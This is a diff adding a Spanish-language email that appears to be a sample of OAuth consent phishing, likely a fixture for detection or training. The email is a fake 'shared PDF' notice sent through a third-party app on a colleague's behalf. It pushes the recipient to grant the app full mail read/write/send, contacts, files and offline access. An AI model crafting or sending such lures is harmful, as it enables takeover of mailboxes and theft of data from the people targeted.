@@ -1,0 +1,32 @@
+Return-Path: <kevin.arias@bahareque.example>
+Received: from envio.suite-nube.example (envio.suite-nube.example [2001:db8:5a17::25])
+	by entrada.suite-nube.example with ESMTPS id GVJC8DQ725; Thu, 12 Nov 2026 14:48:08 -0500
+Received: from api.suite-nube.example (aplicación OAuth lpdfpro-7731)
+	by envio.suite-nube.example with HTTPS id LD72FKLN9G
+	(en nombre de kevin.arias@bahareque.example); Thu, 12 Nov 2026 14:48:06 -0500
+Authentication-Results: entrada.suite-nube.example;
+	spf=pass smtp.mailfrom=bahareque.example;
+	dkim=none (mensaje sin firma);
+	dmarc=none (bahareque.example no publica política) header.from=bahareque.example
+X-Filtro-Bahareque: interno; analisis=no-aplica
+X-Enviado-Por-Aplicacion: Lector PDF Pro (client_id lpdfpro-7731)
+From: "Kevin Arias Montoya" <kevin.arias@bahareque.example>
+To: "Diana Bedoya Arias" <diana.bedoya@bahareque.example>
+Subject: Kevin Arias Montoya compartió «Procedimiento devoluciones Guadua v3.pdf» con usted
+Date: Thu, 12 Nov 2026 14:48:05 -0500
+Message-ID: <20261112144805.7g5nk95y@bahareque.example>
+MIME-Version: 1.0
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+
+Kevin Arias Montoya compartió un documento con usted.
+
+  Procedimiento devoluciones Guadua v3.pdf (1,8 MB)
+
+Para verlo, ábralo con Lector PDF Pro. La primera vez le pedirá aceptar los permisos de la aplicación; acéptelos para que el documento cargue.
+
+Abrir con Lector PDF Pro:
+https://cuentas.suite-nube.example/oauth2/autorizar?client_id=lpdfpro-7731&redirect_uri=https%3A%2F%2Flector-pdf-pro.example%2Fcallback&scope=Correo.LeerEscribir.Todos%20Correo.Enviar.Todos%20Contactos.Leer.Todos%20Archivos.Leer.Todos%20offline_access&prompt=consent
+
+Lector PDF Pro · Documentos sin complicaciones
+Recibe este mensaje porque Kevin Arias Montoya lo compartió con usted.
